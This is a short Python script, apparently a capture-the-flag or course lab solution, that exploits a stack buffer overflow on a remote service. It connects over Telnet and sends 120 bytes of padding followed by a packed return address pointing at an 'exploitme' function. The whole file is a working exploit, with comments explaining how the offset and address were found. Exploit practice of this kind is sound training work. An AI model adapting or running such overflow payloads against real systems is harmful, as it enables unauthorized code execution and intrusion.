from telnetlib import Telnet
import struct

RHOST = "cits4projtg.cybernemosyne.xyz"
RPORT = 1002

ATTACK_REMOTE = True

# Offset found using EDB and the pattern.py script
OFFSET = 120
# Target address for exploitme function was found using objdump
TARGET_ADDRESS_INT = '0x000000000040125f'
payload_prefix = b"test\n"
payload = b"A"*OFFSET + struct.pack('<Q', int(TARGET_ADDRESS_INT, base=16))

if ATTACK_REMOTE:
    with Telnet(RHOST, RPORT) as r_conn:
        r_conn.write(payload_prefix)
        r_conn.write(payload + b"\n")
        print(r_conn.read_all().decode())
